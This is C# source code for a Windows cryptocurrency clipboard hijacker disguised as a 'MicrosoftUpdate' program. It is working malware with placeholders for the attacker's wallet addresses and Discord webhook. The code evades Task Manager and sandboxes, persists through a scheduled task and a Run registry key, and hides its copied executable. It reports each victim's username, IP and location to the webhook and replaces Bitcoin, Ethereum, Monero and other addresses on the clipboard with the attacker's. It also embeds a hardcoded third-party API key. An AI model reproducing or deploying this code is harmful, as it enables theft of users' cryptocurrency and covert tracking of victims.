using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Management;

namespace Update
{
    public class Program
    {
        #region hiddenstuff
        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);
        #endregion

        #region protection
        static void MonitorVSez()
        {
            while (true)
            {
                try
                {
                    foreach (Process item in Process.GetProcesses())
                        if (item.ProcessName.ToLower() == "taskmgr"
                             || item.ProcessName.ToLower() == "Anti-Stealer"
                             || item.ProcessName.ToLower() == "BtcClipperDetector")
                            Environment.Exit(0);
                    Thread.Sleep(500);
                }
                catch
                { }
            }
        }
        #endregion

        #region schtask
        static void schtaskumatidar()
        {
            string taskexistance(string taskname)
            {
                string takeproc = System.AppDomain.CurrentDomain.FriendlyName;
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "schtasks.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.WindowStyle = ProcessWindowStyle.Hidden;
                start.Arguments = "/query /TN " + taskname;
                start.RedirectStandardOutput = true;
                using (Process process = Process.Start(start))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string stdout = reader.ReadToEnd();
                        if (!stdout.Contains(taskname))
                        {
                            cmd("schtasks.exe /create /tn hspintsdk /tr %APPDATA%/MicrosoftUpdate/" + takeproc + " /SC minute /mo 1");
                            return "true.";
                        }
                        else
                        {
                            return "false.";
                        }
                    }
                }
            }
            taskexistance("hspintsdk").ToString();
        }
        #endregion

        #region cmd
        public static void cmd(string command)
        {
            var process = new Process();
            process.StartInfo = new ProcessStartInfo("cmd", "/C " + command);
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
        }
        #endregion

        #region mutexstuff
        public static string mutex = "randomgangshit1337696969699696969696k1k1k1k1";
        class AppMutex
        {
            public static void Check()
            {
                bool createdNew = false;
                Mutex currentApp = new Mutex(false, mutex, out createdNew);
                if (!createdNew)
                    Environment.Exit(1);
            }
        }
        #endregion

        #region otherprots
        internal sealed class SandBox
        {
            [System.Runtime.InteropServices.DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
            public static bool Check()
            {
                string[] dlls = new string[5]
                {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
                };
                for (int i = 0; i < dlls.Length; i++)
                    if (GetModuleHandle(dlls[i]).ToInt32() != 0)
                        return true;
                return false;
            }
        }
        #endregion

        #region otherprotsfunc
        static void MonitorVSshits()
        {
            while (true)
            {
                try
                {
                    if (SandBox.Check() == true)
                        Environment.Exit(0);
                    Thread.Sleep(500);
                }
                catch
                { }
            }
        }
        #endregion

        public static void Main()
        {
            #region protectionsapply
            Thread th = new Thread(MonitorVSez);
            th.Start();
            #endregion

            #region protectionsagainst2shitsapply
            Thread th2 = new Thread(MonitorVSshits);
            th2.Start();
            #endregion

            #region mutex
            AppMutex.Check();
            #endregion

            #region vars
            string takeproc = System.AppDomain.CurrentDomain.FriendlyName;
            #endregion

            #region cryptologs
            using (DcWebHooklogs dcWeb = new DcWebHooklogs())
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    String OSName = managementObject["Caption"].ToString();
                    dcWeb.ProfilePicture = "https://i.imgur.com/BcpHeJb.png";
                    dcWeb.UserName = "HACKERMAN";
                    dcWeb.WebHook = "discordwebhooklink"; //add here
                    dcWeb.SendMessage("```" + "You got a new victim infected with crypto stealer." + " | " + "PC Username: " + Environment.UserName + " , " + "IP: " + GetIPAddress() + " , " + " Country: " + GetCountry() + " , " + " City: " + GetCity() + Environment.NewLine + "OS: " + OSName + "```");
                }
            }
            #endregion

            #region schtaskapply
            Thread hatzu = new Thread(schtaskumatidar);
            hatzu.Start();
            #endregion

            #region hidestartup
                        string folderName = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Roaming\MicrosoftUpdate\");
                        string destinatione = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Roaming\MicrosoftUpdate\" + takeproc);
                        if (!File.Exists(destinatione))
                        {
                            System.IO.Directory.CreateDirectory(folderName);
                            File.Copy(takeproc, destinatione);

                            File.SetAttributes(folderName, FileAttributes.Hidden | FileAttributes.System);
                            File.SetAttributes(destinatione, FileAttributes.Hidden | FileAttributes.System);
                        }
                        #endregion

            #region startupkeyreg
                        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        rk.SetValue(Path.GetFileName(destinatione), destinatione);
                        #endregion
            
            #region runcommand
            new Thread(() => { Run(); }).Start();
            #endregion
        }

        #region runfunc
        public static void Run()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }
        #endregion

        #region apis
        public static string GetIPAddress()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }
        public static string GetCountry()
        {
            string Getcountry = new WebClient().DownloadString("https://api.ipdata.co/country_name?api-key=df30cae513ff5b0d6549de198e512b1df53dced48ae5fe2d62e352e6");
            return Getcountry;
        }
        public static string GetCity()
        {
            string Getcity = new WebClient().DownloadString("https://api.ipdata.co/city?api-key=df30cae513ff5b0d6549de198e512b1df53dced48ae5fe2d62e352e6");
            return Getcity;
        }
        #endregion
    }

    #region patterns
    internal static class PatternRegex
    {
        public readonly static Regex btc = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
        public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //eth
        public readonly static Regex xlm = new Regex(@"(?:^G[0-9a-zA-Z]{55}$)"); // stellar
        public readonly static Regex bch = new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})"); // bitcoin cash
        public readonly static Regex xmr = new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)"); // monero
        public readonly static Regex ltc = new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)"); // litecoin
    }
    #endregion

    #region methods
    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
    internal static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }
        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }
    #endregion

    #region methods2
    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            private static string currentClipboard = Clipboard.GetText();
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }
            private bool RegexResult(Regex pattern)
            {
                if (pattern.Match(currentClipboard).Success) return true;
                else
                    return false;
            }
            protected override void WndProc(ref Message m)
            {
                    if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                    {
                        currentClipboard = Clipboard.GetText();
                    #endregion

                    #region addys
                        string btcaddy = "btcaddyhere"; //btc
                        string ethaddy = "ethaddyhere"; //eth
                        string xlmaddy = "stellaraddyhere"; // stellar
                        string bchaddy = "bitcoincashaddyhere"; //bitcoin cash
                        string xmraddy = "moneroaddyhere"; //monero
                        string ltcaddy = "litecoinaddyhere"; //litecoin
                    #endregion

                    #region patternsapply
                        if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(btcaddy))
                        {
                        string result = PatternRegex.btc.Replace(currentClipboard, btcaddy);
                        Clipboard.SetText(result);
                        }
                        if (RegexResult(PatternRegex.ethereum) && !currentClipboard.Contains(ethaddy))
                        {
                        string result = PatternRegex.ethereum.Replace(currentClipboard, ethaddy);
                        Clipboard.SetText(result);
                        }
                        if (RegexResult(PatternRegex.xlm) && !currentClipboard.Contains(xlmaddy))
                        {
                        string result = PatternRegex.xlm.Replace(currentClipboard, xlmaddy);
                        Clipboard.SetText(result);
                        }
                        if (RegexResult(PatternRegex.bch) && !currentClipboard.Contains(bchaddy))
                        {
                        string result = PatternRegex.bch.Replace(currentClipboard, bchaddy);
                        Clipboard.SetText(result);
                        }
                        if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(xmraddy))
                        {
                        string result = PatternRegex.xmr.Replace(currentClipboard, xmraddy);
                        Clipboard.SetText(result);
                        }
                        if (RegexResult(PatternRegex.ltc) && !currentClipboard.Contains(ltcaddy))
                        {
                        string result = PatternRegex.ltc.Replace(currentClipboard, ltcaddy);
                        Clipboard.SetText(result);
                        }   
                    #endregion
                }
                base.WndProc(ref m);
            }
        }
    }
}